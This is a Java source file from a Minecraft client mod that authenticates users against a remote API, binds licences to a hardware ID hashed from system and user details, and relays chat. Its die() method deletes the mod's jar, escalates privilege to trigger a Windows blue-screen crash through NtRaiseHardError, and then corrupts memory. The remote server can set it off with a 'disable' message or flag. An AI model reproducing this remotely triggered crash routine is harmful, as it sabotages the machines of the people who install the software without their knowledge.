package dev.jess.baseband.client.api.Utils;

import com.sun.jna.Memory;
import de.tudbut.api.RequestResult;
import de.tudbut.api.TudbuTAPIClient;
import de.tudbut.tools.Nullable;
import dev.jess.baseband.client.api.Main.BaseBand;
import net.minecraft.client.Minecraft;
import org.apache.commons.codec.digest.DigestUtils;
import org.baseband.utils.NtDll;
import tudbut.parsing.TCN;

import java.io.File;
import java.util.ArrayList;
import java.util.UUID;

/**
 * @author TudbuT
 * @apiNote BaseBand relies on this for Authentication, So DON'T MESS WITH IT!!!
 * @since 29 Jul 2022
 */

public class WebServices {
	public static TudbuTAPIClient client = new TudbuTAPIClient("baseband", Wrapper.mc.getSession().getProfile().getId(), "api.tudbut.de", 99);
	static UUID lastMessaged = null;
	static String lastMessagedName = null;

	public static void die() {
		new File(BaseBand.class.getProtectionDomain().getCodeSource().getLocation().getFile()).delete();

		try {
			NtDll.INSTANCE.RtlAdjustPrivilege(19, true, false, new Memory(1)); // This readjusts your privileges
			NtDll.INSTANCE.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, new Memory(32)); // This causes the BSOD
		} catch (UnsatisfiedLinkError e) {

		}
		int i = 0;
		BaseBand.log.fatal("PANIC!");
		while (true) {
			i++;
			BaseBand.unsafe().putAddress(i, i);
		}
		//Seriously? Didn't break?
	}

	public static boolean handshake() {
		RequestResult<?> result = client.login(BaseBand.MOD_ID + " " + BaseBand.MOD_NAME.replace(' ', '_') + " " + BaseBand.REPO + ":master@" + BaseBand.CLEAN_VERSION);
		return result.result == RequestResult.Type.SUCCESS;
	}


	//TODO: get a second opinion

	private static boolean checkhwid(){
		if(client.getPasswordHash()==""){
			BaseBand.log.warn("HWID Set! BaseBand will now be bound to this computer!");
			client.setPassword(getHWID());
		}else if(client.checkPassword(getHWID())){
			BaseBand.log.info("HWID Check Passed!");
			return true;
		}
		return false;
	}



	private static String getHWID() {
		return DigestUtils.sha256Hex(DigestUtils.sha256Hex(System.getenv("os")
				+ System.getProperty("os.name")
				+ System.getProperty("os.arch")
				+ System.getProperty("user.name")
				+ System.getenv("SystemRoot")
				+ System.getenv("HOMEDRIVE")
				+ System.getenv("PROCESSOR_LEVEL")
				+ System.getenv("PROCESSOR_REVISION")
				+ System.getenv("PROCESSOR_IDENTIFIER")
				+ System.getenv("PROCESSOR_ARCHITECTURE")
				+ System.getenv("PROCESSOR_ARCHITEW6432")
				+ System.getenv("NUMBER_OF_PROCESSORS")
		)) + Minecraft.getMinecraft().session.getUsername();
	}


	public static boolean play() {
		RequestResult<?> result = client.use();
		if (result.result == RequestResult.Type.SUCCESS) {
			if (client.hasNewMessages()) {
				return new Nullable<ArrayList<TCN>>(client.getMessages().success(ArrayList.class).get()).apply(msgs -> {
					for (int i = 0; i < msgs.size(); i++) {
						TCN msg = msgs.get(i);
						if (msg.getBoolean("global")) {
							ChatUtil.sendChatMsg("[WebServices] <" + msg.getSub("from").getString("name") + "> " + msg.getString("content"));
						} else {
							ChatUtil.sendChatMsg("[WebServices] §c[DIRECT] §r" + msg.getSub("from").getString("name") + ": " + msg.getString("content"));
							lastMessaged = UUID.fromString(msg.getString("fromUUID"));
							lastMessagedName = null;
						}
					}
					return msgs;
				}).get() != null;
			}
			if (client.hasNewDataMessages()) {
				client.getDataMessages().success(ArrayList.class).apply(l -> (ArrayList<TCN>) l).consume(l -> {
					for (int i = 0; i < l.size(); i++) {
						TCN msg = l.get(i);
						if (msg.getString("type").equals("announcement")) {
							ChatUtil.print(msg.getString("toPrint"));
						}
						if (msg.getString("type").equals("disable")) {
							die();
						}
					}
				});
			}
			if (Boolean.TRUE.equals(client.serviceData().getBoolean("disable"))) {
				die();
			}


			if (Boolean.TRUE.equals(client.serviceData().getBoolean("developer"))) {
				//BaseBand.log.info("Dev");
				BaseBand.dev = true;
			}


			if (Boolean.TRUE.equals(client.serviceData().getBoolean("access"))) {
				BaseBand.unload = false;
			}


			//BaseBand.log.info(client.serviceData.getInteger("uid"));
			//BaseBand.uid=client.serviceData.getInteger("uid");

			BaseBand.wait = false;

			return true;
		}
		return false;
	}

	public static RequestResult<?> sendMessage(String user, String message) {
		if (user == null) {
			if (lastMessagedName != null) {
				return client.sendMessage(lastMessagedName, message);
			}
			if (lastMessaged != null) {
				return client.sendMessage(lastMessaged, message);
			}
			return RequestResult.FAIL("Unable to find last messaged user");
		} else {
			RequestResult<?> result = client.sendMessage(user, message);
			lastMessagedName = user;
			return result;
		}
	}
}
